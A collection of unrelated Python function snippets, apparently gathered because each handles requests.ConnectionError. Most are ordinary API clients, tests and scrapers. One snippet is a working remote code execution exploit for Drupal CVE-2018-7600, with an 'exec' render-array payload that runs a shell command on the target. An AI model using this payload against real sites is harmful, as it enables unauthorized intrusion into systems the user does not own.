        r = requests.post(url, data=json.dumps(payload),
                          headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    return r


# Login. 
**************************************
def download_file(server_name, report_url, session_id, file_name):
    headers = {'content-type': 'application/json'}

    try:
        r = requests.get(report_url, headers=headers, verify=False, stream=True)
        # if HTTP Response is not 200 then raise an exception
        if r.status_code != 200:
            message = "The HTTP response for get call to the server is not 200."
            raise TintriApiException(message, r.status_code, report_url, "No Payload", r.text)

        with open(file_name, 'w') as file_h:
            for block in r.iter_content(4096):
                file_h.write(block)

    except requests.ConnectionError:
        raise TintriRequestsException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except Exception as e:
        raise TintriRequestsException("An unexpected error: " + e.__str__()) 
**************************************
def do(self, api_name=None, pk=None, method='get', use_auth=True,
           data=None, params=None, content_type='application/json', **kwargs):

        if api_name in API_URL_MAPPING:
            path = API_URL_MAPPING.get(api_name)
            if pk and '%s' in path:
                path = path % pk
        else:
            path = api_name

        request_headers = kwargs.get('headers', {})
        default_headers = self.default_headers or {}
        headers = {k: v for k, v in default_headers.items()}
        headers.update(request_headers)
        kwargs['headers'] = headers
        url = self.endpoint.rstrip('/') + path
        req = HttpRequest(url, method=method, data=data,
                          params=params, content_type=content_type,
                          **kwargs)
        if use_auth:
            if not self.auth:
                msg = 'Authentication required, but not provide'
                logger.error(msg)
                raise RequestError(msg)
            else:
                self.auth.sign_request(req)

        try:
            resp = req.do()
        except (requests.ConnectionError, requests.ConnectTimeout) as e:
            msg = "Connect endpoint {} error: {}".format(self.endpoint, e)
            logger.error(msg)
            raise RequestError(msg)

        return self.clean_result(resp) 
**************************************
def PullNews(self):
        Configuration = ConfigurationReader()
        self.__APIKey=Configuration.GetAPIKEY()
        self.__Limit=Configuration.GetLimit()
        url='https://newsapi.org/v2/top-headlines?sources='+self.Source+'&sortBy=top&apiKey='+self.__APIKey
        try:
            req=requests.get(url)
            if(req.status_code==200):
                return req
            else:
                print "There is some issue in connecting to the internet. Please check your firewall or internet"
        except ConnectionError as e:
            print "A connection Attempt failed"
            print e.message
            sys.exit() 
**************************************
def _send_to_rest_api(self, suffix, data=None, content_type=None):
        '''Send a REST command to the Validator via the REST API.

           Called by count() &  _wrap_and_send().
           The latter caller is made on the behalf of bake() & eat().
        '''
        url = "{}/{}".format(self._base_url, suffix)
        print("URL to send to REST API is {}".format(url))

        headers = {}

        if content_type is not None:
            headers['Content-Type'] = content_type

        try:
            if data is not None:
                result = requests.post(url, headers=headers, data=data)
            else:
                result = requests.get(url, headers=headers)

            if not result.ok:
                raise Exception("Error {}: {}".format(
                    result.status_code, result.reason))
        except requests.ConnectionError as err:
            raise Exception(
                'Failed to connect to {}: {}'.format(url, str(err)))
        except BaseException as err:
            raise Exception(err)

        return result.text 
**************************************
def get_ec2_instance_type():
    url = "http://169.254.169.254/latest/meta-data/instance-type" # TODO: fix/remove
    try:
        response = requests.post(url)
    except requests.ConnectionError, e:
        logger.error("Error finding instance-type")
        return 
**************************************
def ec2InstanceType():
    url = "http://169.254.169.254/latest/meta-data/instance-type"
    try:
        response = requests.post(url)
    except requests.ConnectionError, e:
        print "Error finding instance-type"
        return 
**************************************
def fetch_lyric(artist, title):
    try:
        response = requests.get('http://api.chartlyrics.com/apiv1.asmx/SearchLyricDirect\
                        ?artist={0}&song={1}'.format(artist, title))
        print(artist, ' ', title, 'response code: ', response.status_code)
        return response
    except requests.ConnectionError as e:
        print(artist, ' ', title, 'Fetching failed :', e)
        raise
    except Exception as e:
        return None 
**************************************
def get_lyric(artist, title):
    result = None
    try:
        response = fetch_lyric(artist, title)
    except requests.ConnectionError as e:
        return (None, "Check your network connection.")
    if response is not None:
        result = parse_response(response)
    else:
        return (None, "Some error happend")
    if result is not None:
        result += "\n\n Lyric source: chartlyrics.com"
    return (result, None) 
**************************************
def fetch_lyric(artist, title):
    try:
        response = requests.get(
            'http://api.vagalume.com.br/search.php?art={0}&mus={1}'.format(artist, title))
        print(artist, ' ', title, 'response code: ', response.status_code)
        return response
    except requests.ConnectionError as e:
        print(artist, ' ', title, 'Fetching failed :', e)
        raise
    except Exception as e:
        return None 
**************************************
def get_lyric(artist, title):
    result = None
    try:
        response = fetch_lyric(artist.split(';')[0], title)
    except requests.ConnectionError as e:
        return (None, "Check your network connection.")
    if response is not None:
        result = parse_response(response)
    else:
        return (None, "Some error happend")
    if result is not None:
        result += "\n\n Lyric source: chartlyrics.com"
    return (result, None) 
**************************************
def download_file(self, report_url, file_name):
        """
        Downloads the file pointed by URL.

        Args:
        
            report_url (str): URL returned from API from which file can be downloaded
            file_name (str): Name to be used for downloaded file 
        """
        headers = {'content-type': 'application/json'}
    
        try:
            r = requests.get(report_url, headers=headers, verify=False, stream=True)
            if r.status_code != 200:
                message = "The HTTP response for get call on: %s is %s" % (report_url, r.status_code)
                raise TintriServerError(r.status_code, message=message)
    
            with open(file_name, 'w') as file_h:
                for block in r.iter_content(4096):
                    file_h.write(block)

        except TintriServerError:
            raise    
        except requests.ConnectionError:
            raise TintriError("API Connection error occurred.")
        except requests.HTTPError:
            raise TintriError("HTTP error occurred.")
        except requests.Timeout:
            raise TintriError("Request timed out.")
        except Exception as e:
            raise TintriError("An unexpected error occurred: " + e.__str__()) 
**************************************
def connection_refused_matcher(request):
    raise requests.ConnectionError("connection refused") 
**************************************
def get_request(url, err_msg):
        try:
            req = requests.get(url)
        except requests.ConnectionError:
            abort(err_msg)

        if not req.status_code == requests.codes.ok:
            abort(err_msg)

        return req 
**************************************
def test_POST_good():
    '''The server should accept a POST with a good URI and redirect to root.'''
    print("Testing POST request with good URI.")

    uri = "http://localhost:8000/"
    data = {'shortname': 'google', 'longuri': 'http://www.google.com/'}
    try:
        r = requests.post(uri, data=data, allow_redirects=False)
    except requests.ConnectionError as e:
        return ("Server dropped the connection. Step 1 or 5 isn't done yet?")

    if r.status_code == 501:
        return ("The server returned status code 501 Not Implemented.\n"
                "This means it doesn't know how to handle a POST request.\n"
                "(Is the correct server code running?)")
    elif r.status_code != 303:
        return ("Server returned status code {} instead of 303 when I gave\n"
                "it a good URI in a POST request.".format(r.status_code))
    elif 'location' not in r.headers:
        return ("Server returned a 303 redirect with no Location header.")
    elif r.headers['location'] != '/':
        return ("Server returned redirect to {} instead of to /."
                .format(r.headers['location']))
    else:
        print("POST request with bad URI correctly got a 303 to /.")
        return None 
**************************************
def test_GET_path():
    '''The server should redirect on a GET to a recorded URI.'''

    uri = "http://localhost:8000/google"
    orig = "http://www.google.com/"
    print("Testing GET request to {}.".format(uri))

    try:
        r = requests.get(uri, allow_redirects=False)
    except requests.ConnectionError as e:
        return ("Server dropped the connection. Step 1 or 5 isn't done yet?")

    if r.status_code == 501:
        return ("The server returned status code 501 Not Implemented.\n"
                "This means it doesn't know how to handle a GET request.\n"
                "(Is the correct server code running?)")
    elif r.status_code != 303:
        return ("Server returned status code {} instead of 303 when I asked\n"
                "for it to follow a short URI.".format(r.status_code))
    elif 'location' not in r.headers:
        return ("Server returned a 303 with no Location header.")
    elif r.headers['location'] != 'http://www.google.com/':
        return ("Server returned a 303, but with a Location header of {}\n"
                "when I expected it to be http://www.google.com/."
                .format(r.headers('location')))
    else:
        print("GET request to {} returned 303 to {} successfully"
              .format(uri, orig)) 
**************************************
def test_is_working_url_url_with_exception(self, req_mock):
        url_validator = UrlValidator(self.catalog, True, 1, 10)
        req_mock.head(self.test_url, exc=ConnectionError)
        self.assertEqual(
            (False, None), url_validator.is_working_url(self.test_url)) 
**************************************
def run(self):
        if self.retrying:
            self.connect_with_retrying()
        else:
            try:
                self.connect()
            except requests.ConnectionError:
                self.callback(STATUS_NO_CONNECTION) 
**************************************
def test_connection_error(self, error_handler):
        """Should call logging error handler when offline"""
        self.rm.post('https://some-hook.com/exception-log', exc=requests.ConnectionError)
        logger = self._build_logger('exception', 'https://some-hook.com/exception-log')
        logger.info("Testing when something fails on the wire")
        self.assertEqual(self.rm.call_count, 1)
        error_handler.assert_called_once() 
**************************************
def test_timeout(self):
        self.akismet = Akismet(os.environ['AKISMET_API_KEY'], timeout=0.000001, is_test=True)

        with self.assertRaises(requests.ConnectionError):
            self.akismet.submit_ham('127.0.0.1', USER_AGENT, blog='http://127.0.0.1') 
**************************************
def request_naver_endic_url(naver_endic_url):
    """
    Send a GET request to NAVER dictionary url

    """

    try:
        response = requests.get(naver_endic_url)
    except requests.ConnectionError:
        raise NdicConnectionError()
    return response 
**************************************
def validate(self, badge_id):
    """Validates the badge ID with a HTTP service. Any 2xx is considered success.

    Args:
      badge_id: String containing the badge identifier to authorize.
    Returns:
      Response boolean.
    """
    try:
      r = requests.get(url = self._url, params = {self._key_param: badge_id})
      return r.status_code >= 200 and r.status_code < 300
    except requests.ConnectionError:
      return False 
**************************************
def job(url, manga_name):
    def download(url, file_name, manga_name):
        if config['general']['short_title'] == 0:
            manga_name = manga_name.decode('utf-8')

        # That Unicode Stuff sucks so hard...
        if config['general']['save_path']:
            manga_path = os.path.dirname(config['general']['save_path']) + '/' + \
            manga_name + '/'
        else:
            manga_path = os.path.dirname(os.path.realpath(__file__)) + '/' + \
            manga_name + '/'
        try:
            os.makedirs(manga_path)
        except OSError:
            if not os.path.isdir(manga_path):
                raise
        #print("Download URL: ", url)
        with open(os.path.join(manga_path, file_name), "wb") as file:
            response = get(url)
            file.write(response.content)
    try:
        # Get HTTP Status Code
        # nhentai uses not only jpg.. argh
        # if 404 try some other Formats...
        # TODO: Rework this to read format out of HTML..
        formats = ["jpg", "png", "gif"]

        for i in formats:
            url_temp = url + i
            http_code  = requests.head(url_temp).status_code
            #print ("HTTP Code: ", http_code)
            if http_code == 200: # OK
                url = url_temp
                file_name = str(url.split('/')[-1])
                download(url, file_name, manga_name)

    except requests.ConnectionError:
        print("failed to connect") 
**************************************
def check_for_no_access(url, verify=False):
    try:
        requests.get(url, verify=verify)
        return False
    except requests.ConnectionError:
        print("Connection Error - " + url)
        return True 
**************************************
def location2degrees(self):
        """Fetches degrees based on the given location."""
        error_log = (
            "Following error occured while trying to fetch lat/lon"
            "for location <{}>:\n{}"
        )
        goole_api_url = "http://maps.googleapis.com/maps/api/geocode/json"
        try:
            result = requests.get(goole_api_url, params={
                "sensor": "false",
                "address": self.arguments.location
            })
        except (
            requests.ConnectionError,
            requests.HTTPError,
            requests.Timeout,
        ) as e:
            error_log = error_log.format(self.arguments.location, e)
            raise RipeAtlasToolsException(error_log)

        result = result.json()

        try:
            lat = result["results"][0]["geometry"]["location"]["lat"]
            lng = result["results"][0]["geometry"]["location"]["lng"]
        except (KeyError, IndexError) as e:
            error = error_log.format(self.arguments.location, e)
            raise RipeAtlasToolsException(error)

        return str(lat), str(lng) 
**************************************
def _fetch_inventory(self, inventory_url: str, config: SphinxConfiguration) -> Optional[dict]:
        """Get and return inventory from `inventory_url`. If fetching fails, return None."""
        fetch_func = functools.partial(intersphinx.fetch_inventory, config, '', inventory_url)
        for retry in range(1, FAILED_REQUEST_RETRY_AMOUNT+1):
            try:
                package = await self.bot.loop.run_in_executor(None, fetch_func)
            except ConnectTimeout:
                log.error(
                    f"Fetching of inventory {inventory_url} timed out,"
                    f" trying again. ({retry}/{FAILED_REQUEST_RETRY_AMOUNT})"
                )
            except ProtocolError:
                log.error(
                    f"Connection lost while fetching inventory {inventory_url},"
                    f" trying again. ({retry}/{FAILED_REQUEST_RETRY_AMOUNT})"
                )
            except HTTPError as e:
                log.error(f"Fetching of inventory {inventory_url} failed with status code {e.response.status_code}.")
                return None
            except ConnectionError:
                log.error(f"Couldn't establish connection to inventory {inventory_url}.")
                return None
            else:
                return package
        log.error(f"Fetching of inventory {inventory_url} failed.")
        return None 
**************************************
def process_ambari_config(module, protocol, host, port, username, password, cluster_name, config_type, config_tag, config_map, ignore_secret, connection_timeout):
    ambari_url = '{0}://{1}:{2}'.format(protocol, host, port)

    try:
        # Get current effective version/tag if not specified
        if config_tag is None:
            config_index = get_cluster_config_index(
                ambari_url, username, password, cluster_name, connection_timeout)
            config_tag = config_index[config_type]["tag"]
        # Get config using the effective tag
        overall_cluster_config = get_cluster_config(
            ambari_url, username, password, cluster_name, config_type, config_tag, connection_timeout)
        cluster_config = overall_cluster_config['properties']
        
        changed, has_secrets, result_map, updated_map = sync_config_map_with_cluster(cluster_config, config_map, ignore_secret)

        if changed:
            request = update_cluster_config(
                ambari_url, username, password, cluster_name, config_type, result_map, extract_properties_attributes(overall_cluster_config), connection_timeout)
            module.exit_json(
                changed=True, results=request.content, msg={'result': result_map, 'updates': updated_map})
        else:
            if has_secrets:
                request = update_cluster_config(ambari_url, username, password, cluster_name,
                                                config_type, result_map, extract_properties_attributes(overall_cluster_config), connection_timeout)
                module.exit_json(
                    changed=False, results=request.content, msg={'result': result_map, 'updates': updated_map})
            else:
                module.exit_json(changed=False, msg='No changes in config')
    except requests.ConnectionError as e:
        module.fail_json(
            msg="Could not connect to Ambari client: " + str(e.message), stacktrace=traceback.format_exc())
    except AssertionError as e:
        module.fail_json(msg=e.message, stacktrace=traceback.format_exc())
    except Exception as e:
        module.fail_json(
            msg="Ambari client exception occurred: " + str(e.message), stacktrace=traceback.format_exc()) 
**************************************
def _request(self, url, args=dict()):
        if self.token:
            args["X-Plex-Token"] = self.token

        try:
            result = self.session.get("%s%s" % (self.url, url), params=args)
            logger.debug(u"PLEX => requested url: %(url)s" % {"url": url})
            logger.debug(u"PLEX => requests args: %s" % args)

            if result.status_code == 401 and config.PMS_USER != "username" and config.PMS_PASS != "password":
                logger.debug(u"PLEX => request failed, trying with auth")
                self.session.headers.update({'X-Plex-Client-Identifier': 'plexivity'})
                self.session.headers.update({'Content-Length': 0})

                self.session.auth = (config.PMS_USER, config.PMS_PASS)
                x = self.session.post("https://my.plexapp.com/users/sign_in.xml")
                if x.ok:
                    json = xml2json(x.content, strip_ns=False)
                    self.token = json["user"]["authentication-token"]
                    args["X-Plex-Token"] = self.token
                    logger.debug(u"PLEX => auth successfull, requesting url %(url)s again" % {"url": url})
                    result = self.session.get("%s%s" % (self.url, url), params=args)
                else:
                    return False

            if result and "xml" in result.headers['content-type']:
                import xml.etree.ElementTree as ET
                #json = xml2json(result.content, strip_ns=False)
                json = ET.fromstring(result.content)
                return json
            elif result.ok:
                return result.content
            else:
                logger.error(u"PLEX => there was an error with the request")
                return False

        except requests.ConnectionError:
            logger.error(u"PLEX => could not connect to Server!!!")
            return False 
**************************************
def test_raise_exception_if_ping_encounters_connection_error(get_phab_client):
    phab = get_phab_client(api_key="api-key")
    with requests_mock.mock() as m:
        # Test with the generic ConnectionError, which is a superclass for
        # other connection error types.
        m.get(phab_url("conduit.ping"), exc=requests.ConnectionError)

        with pytest.raises(PhabricatorAPIException):
            phab.call_conduit("conduit.ping")
        assert m.called 
**************************************
def fetch_list(username, type):
    validate_media(type)
    cursor, page, step = 0, 0, 300

    medialist = []
    timeouts = timeouts_coroutine(quiet=True)
    while True:
        try:
            url = medialist_url(username, type, cursor + page*step)
            medialist_http = requests.get(url)
            if medialist_http.status_code == 429:
                timeouts(False)
                continue
            list_page = parse_media_json(medialist_http.json(), type)
            medialist += list_page
            if not list_page or len(list_page) < 300:
                return medialist
            timeouts(True)
            page += 1
        except requests.ConnectionError as err:
            timeouts(False)
            print(f"requests.ConnectionError: {err}")
            continue
        except Exception as err:
            if medialist_http.reason == 'Bad Request':
                return []
    return None 
**************************************
def _get_requests(self, url):
        out = self.empty_json
        try:
            r = requests.get(url, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout, stream=True)
            s = ""
            for chunk in r.iter_content(1024):
                if chunk:
                    s += chunk
            out = json.loads(s)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        
        return r.status_code, "OK", out 
**************************************
def _post_requests(self, url, data=""):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            r = requests.post(url, data=data, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def run(username, password):
    if username is None or password is None:
        return 'Empty username or password'

    try:
        api = AnyDoAPI(username=username, password=password)
    except ConnectionError:
        return 'Check internet connection'

    try:
        tasks = api.get_all_tasks()
    except AnyDoAPIError:
        return 'AnyDo API error.<br>Check username and password'

    for task in tasks:
        try:
            task['dueDate'] = convert_epoch_timestamp(task['dueDate'])\
                .strftime('%c')
        except KeyError:
            pass
        try:
            if task['alert']['type'] == 'OFFSET':
                task['alert']['repeatStartsOn'] = convert_epoch_timestamp(
                    task['alert']['repeatStartsOn']).strftime('%c')
        except KeyError:
            pass

    return json.dumps(tasks) 
**************************************
def test_validate_href_error(self, head_mock):
        href = 'http://1.2.3.4/abc.iso'
        head_mock.side_effect = requests.ConnectionError()
        self.assertRaises(exception.ImageRefValidationFailed,
                          utils.validate_href, href)
        head_mock.assert_called_once_with(href) 
**************************************
def _check_api_info(self):
        try:
            if not self.API_URL:
                for url in self.API_URLS:
                    try:
                        response = self._handle_api_error(requests.get('{}info'.format(url))).json()
                        self.API_URL = url
                        break
                    except requests.ConnectionError:
                        continue
            else:
                try:
                    response = self._handle_api_error(requests.get('{}info'.format(self.API_URL))).json()
                except requests.ConnectionError:
                    self._die_on_error('[ERROR] Provided API URL is unavailable.')

            if not self.API_URL:
                self._die_on_error('[ERROR] SSL Labs APIs are down. Please try again later.')

            self.CLIENT_MAX_ASSESSMENTS = response.get('clientMaxAssessments')
            self.CURRENT_ASSESSMENTS = response.get('currentAssessments')
            self.MAX_ASSESSMENTS = response.get('maxAssessments')
            if self.MAX_ASSESSMENTS<=0:
                LOGGER.debug('Rate limit reached')
                return False
            LOGGER.info('[NOTICE] SSL Labs v{engine_version} (criteria version '
                        '{criteria_version})'.format(
                            engine_version=response.get('engineVersion'),
                            criteria_version=response.get('criteriaVersion')))
            LOGGER.info('[NOTICE] {server_message}'.format(
                server_message=response.get('messages')[0]))
            return True
        except AccessProblem as e:
            raise
        except Exception as e:
            LOGGER.exception(e)
            return False 
**************************************
def pull(self):
        import requests
        dest, headers = self._get_request_info('frames')

        try:
            response = requests.get(
                dest, params={'last_sync': self.last_sync}, headers=headers
            )
            assert response.status_code == 200
        except requests.ConnectionError:
            raise WatsonError("Unable to reach the server.")
        except AssertionError:
            raise WatsonError(
                u"An error occurred with the remote "
                "server: {}".format(response.json())
            )

        frames = response.json() or ()

        for frame in frames:
            frame_id = uuid.UUID(frame['id']).hex
            self.frames[frame_id] = (
                frame['project'],
                frame['start_at'],
                frame['end_at'],
                frame['tags']
            )

        return frames 
**************************************
def push(self, last_pull):
        import requests
        dest, headers = self._get_request_info('frames/bulk')

        frames = []

        for frame in self.frames:
            if last_pull > frame.updated_at > self.last_sync:
                frames.append({
                    'id': uuid.UUID(frame.id).urn,
                    'start_at': str(frame.start.to('utc')),
                    'end_at': str(frame.stop.to('utc')),
                    'project': frame.project,
                    'tags': frame.tags
                })

        try:
            response = requests.post(dest, json.dumps(frames), headers=headers)
            assert response.status_code == 201
        except requests.ConnectionError:
            raise WatsonError("Unable to reach the server.")
        except AssertionError:
            raise WatsonError(
                u"An error occurred with the remote server (status: {}). "
                u"Response was:\n{}".format(
                    response.status_code,
                    response.text
                )
            )

        return frames 
**************************************
def test_run_socket_error(self, m_post):
        m_post.side_effect = requests.ConnectionError
        result = self._test_run('DEL', 'delNetwork', m_post)
        self.assertEqual(1, result) 
**************************************
def connect(self):

        # Spawn child process
        if self._provider_process:
            self._provider_process.start()
            provider_uri = self._provider_process.provider_uri(scheme='file')
        else:
            provider_uri = self.provider_uri
            self.log.info(f"Using external Web3 Provider '{self.provider_uri}'")

        # Attach Provider
        self._attach_provider(provider=self._provider, provider_uri=provider_uri)
        self.log.info("Connecting to {}".format(self.provider_uri))
        if self._provider is NO_BLOCKCHAIN_CONNECTION:
            raise self.NoProvider("There are no configured blockchain providers")

        # Connect if not connected
        try:
            self.w3 = self.Web3(provider=self._provider)
            self.client = Web3Client.from_w3(w3=self.w3)
        except requests.ConnectionError:  # RPC
            raise self.ConnectionFailed(f'Connection Failed - {str(self.provider_uri)} - is RPC enabled?')
        except FileNotFoundError:         # IPC File Protocol
            raise self.ConnectionFailed(f'Connection Failed - {str(self.provider_uri)} - is IPC enabled?')
        else:
            self.attach_middleware()

        return self.is_connected 
**************************************
def test_error_init_with_connectionerror(res):
    connection_error = requests.ConnectionError('unable to connect')

    error = Error(connection_error)
    assert error.http_status == None
    assert error.json_body == None
    assert error.code == None
    assert str(error) == 'unable to connect' 
**************************************
def _request(self, method, url, **kwargs):
        try:
            res = self._session.request(method, url, **kwargs)
            res.raise_for_status()
        except (requests.ConnectionError, requests.HTTPError) as error:
            self._handle_request_error(error)

        try:
            data = res.json()
            if 'paging' in data:
                return response.PaginatedResponse(self, res)
        except ValueError:
            pass

        return response.Response(self, res) 
**************************************
def authenticate(self):
        data = {
            'client_id': self.client_id,
            'client_secret': self.client_secret,
            'grant_type': 'client_credentials'
        }

        try:
            res = self._session.post(self.base_url + '/oauth/token', data=data)
            res.raise_for_status()
        except (requests.HTTPError, requests.ConnectionError) as error:
            self._handle_request_error(error)

        self._auth = res.json() 
**************************************
def file_putter_worker(src, target , client, cache = None ):
    """
    :param src: basestring
    :param target: basestring
    :param client:  DrasticClient
    :param cache: .util._dirmgmt
    :return: N/A
    """

    ### Handle directory creation here...
    ### Note that the cache object recursively creates containers... walking up the tree until it finds a container
    ### and then walking down creating as it goes ...
    ###
    if cache is not None :                  # Cache may be empty, or it may be not present, so be precise.
        tgtdir,nm = os.path.split(target)
        if not cache.getdir(tgtdir, client):
            return {'ok': False, 'msg': 'Failed to Create {} or one of its parents'.format(tgtdir)}

    with open(src, 'rb') as fh:
        try:
            res = client.put(target, fh)
            if res.ok() :
                print 'put ',str(target)
                return {'ok' : True }
        except ConnectionError as e:
            return {'ok': False, 'msg': 'Connection Error'}
        except Exception as e:
            return {'ok': False, 'msg': u'failed to put {} to {} [{} / {}]'.format(src, target,type(e), e)} 
**************************************
def getBitcoinPrice():
    URL = 'https://www.bitstamp.net/api/ticker/'
    try:
        r = requests.get(URL)
        priceFloat = float(json.loads(r.text)['last'])
        return priceFloat
    except requests.ConnectionError:
        print ("Error querying Bitstamp API") 
**************************************
def get(self, ignore404=False):
        """Get web file

            Sometimes console.html is gzipped on logs server and console.html
            is not available anymore, so here it silently fails when trying to
            download console.html and then tries to get console.html.gz
            We don't want redundant error messages in console

        :param ignore404: not to show error message if got 404 error
        :return: request obj
        """
        log.debug("GET {url} with ignore404={i}".format(
            url=self.url, i=str(ignore404)))
        try:
            req = requests.get(self.url, timeout=self.timeout)
        except ConnectionError:
            log.error("Connection error when retriving {}".format(self.url))
            return None
        except Timeout:
            log.error("Timeout reached when retriving {}".format(self.url))
            return None
        except Exception as e:
            log.error("Unknown error when retriving {}: {}".format(
                self.url, str(e)))
            return None
        if int(req.status_code) != 200:
            if not (ignore404 and int(req.status_code) == 404):
                log.warn("Page {url} got status {code}".format(
                    url=self.url, code=req.status_code))
        return req 
**************************************
def get_detail_information(id_link):
    try:
        item_page = requests.get('http://vxvault.net/' + id_link)
    except requests.ConnectionError, e:
        print e
        return False 
**************************************
def fetch(source, local_data=None, validator=None, lookedup_resource=None):
    source_url = source[2]
    # print("Fetching Data from " + source_url + ". This may take some time (hours)!")
    item_infos = []
    step = START
    endofnewdata = False
    while (step <= AMOUNT_LIMIT or AMOUNT_LIMIT is None) and not endofnewdata:
        # slow! atm ~2h for whole download. multithreaded?
        generated_link = source_url + '?s=' + str(step) + '&m=' + str(STEP_RANGE)
        try:
            page = requests.get(generated_link)
        except requests.ConnectionError, e:
            print e
            return False
        tree_page = html.fromstring(page.content)
        id_links = tree_page.xpath('//div[@id="page"]/table/tr/td[1]//@href')
        if len(id_links) == 0:
            break
        else:
            for id_link in id_links:
                # print id_link
                detail = get_detail_information(id_link)
                if detail:
                    if not any(d['md5'] == detail['md5'] for d in local_data):
                        item_infos.append(detail)
                    else:
                        endofnewdata = True
                        break
                else:
                    return False
        step += STEP_RANGE 
**************************************
def exploit(target):
    print exploit_banner

    '''
    Add proxy support (eg. BURP to analyze HTTP(s) traffic)
    set verify = False if your proxy certificate is self signed
    remember to set proxies both for http and https

    example:
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    verify = False
    '''

    proxies = {}
    verify = False

    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "vulnerable to cve-7600-2018 exploit" | tee vulnerable.txt'}
    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    print B + '[*]' + N + ' requesting post'
    r = requests.post(url, proxies=proxies, data=payload, verify=verify)
    print B + '[*]' + N + ' scanning vulnerability'
    try:
        scan = requests.get(target + 'vulnerable.txt')
        if scan.status_code != 200:
           print R + '[-]' + N + ' not vulnerable to cve-2018-7600 exploit \n'
        if scan.status_code == 200:
           print G + '[+]' + N + ' vulnerable to cve-2018-7600 exploit'
           print ' | url: ' + target + 'vulnerable.txt \n'
    except requests.ConnectionError:
        print B + '[*]' + N + ' target connection timeout' 
**************************************
def server():
	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Success ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Failed ' + C + ']' + W)
		Quit() 
**************************************
def api_get_query(server_name, api, query, session_id):
    headers = {'content-type': 'application/json'}
    if session_id is not None:
        headers['cookie'] = 'JSESSIONID=' + session_id

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.get(url, headers=headers, params=query, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("GET: API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    # if HTTP Response is not 200 then raise an exception
    if r.status_code != 200:
        message = "The HTTP response for get call to the server is not 200."
        if (query is None):
            raise TintriApiException(message, r.status_code, url, "No Payload", r.text)
        else:
            raise TintriApiException(message, r.status_code, url, query, r.text)

    return r


# API DELETE. 
**************************************
def api_login(server_name, user_name, password):

    # Payload, header and URL for login call
    headers = {'content-type': 'application/json'}
    payload = {'username': user_name,
               'password': password,
               'typeId': 'com.tintri.api.rest.vcommon.dto.rbac.RestApiCredentials'}
    url_login = 'https://'+ server_name + API + '/v310/session/login'

    try:
        # Invoke the login API.
        r = requests.post(url_login, data=json.dumps(payload),
                          headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("Login: API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("Login: HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Login: Request timed out.")
    except:
        raise TintriRequestsException("Login: An unexpected error " + sys.exc_info()[0] +
            " occurred.")

    # if HTTP Response is not 200 then raise an exception
    if r.status_code != 200:
        message = "The HTTP response for login call to the server is not 200."
        raise TintriApiException(message, r.status_code, url_login, str(payload), r.text)

    session_id = r.cookies['JSESSIONID']

    return session_id


# Logout 
**************************************
def api_get_query(server_name, api, query, session_id):
    headers = {'content-type': 'application/json'}
    if session_id is not None:
        headers['cookie'] = 'JSESSIONID=' + session_id

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.get(url, headers=headers, params=query, verify=False)
    except requests.ConnectionError:
        print_error("API Connection error occurred")
        sys.exit(-2)
    except requests.HTTPError:
